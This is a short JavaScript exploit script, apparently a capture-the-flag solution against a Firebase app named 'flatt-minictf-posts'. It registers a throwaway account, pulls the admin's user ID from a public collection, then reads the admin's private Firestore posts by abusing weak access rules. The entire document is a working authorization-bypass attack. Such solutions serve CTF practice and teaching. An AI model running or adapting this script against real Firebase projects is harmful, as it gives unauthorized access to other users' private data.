(async () => {
  const load = (url) =>
    new Promise((resolve) => {
      const script = document.createElement("script");
      script.setAttribute("src", url);
      script.onload = resolve;
      document.body.appendChild(script);
    });
  await load("https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js");
  await load("https://www.gstatic.com/firebasejs/10.7.0/firebase-auth-compat.js");
  await load("https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore-compat.js");

  firebase.initializeApp({
    apiKey: "AIzaSyClwjd2l_fOntjkl4Ps76Rm9vfdVht9Pg8",
    authDomain: "flatt-minictf-posts.firebaseapp.com",
    projectId: "flatt-minictf-posts",
    storageBucket: "flatt-minictf-posts.appspot.com",
    messagingSenderId: "81392345758",
    appId: "1:81392345758:web:e3f169333bed906545918f"
  });

  await firebase.auth().createUserWithEmailAndPassword('exploit@flatt.tech', 'flattsecurity');
  await firebase.auth().signInWithEmailAndPassword('exploit@flatt.tech', 'flattsecurity');

  let adminId = "";
  const snapshot1 = await firebase.firestore().collection('publicPosts').get();
  for (const doc of snapshot1.docs) {
    const data = doc.data();
    if (data.name === 'admin@flatt.tech') {
      adminId = data.createdBy;
      break;
    }
  }

  const snapshot2 = await firebase.firestore().collection('privatePosts').doc('0').collection(adminId).get();
  snapshot2.docs.forEach(doc => {
    console.log(doc.data());
  });
})();
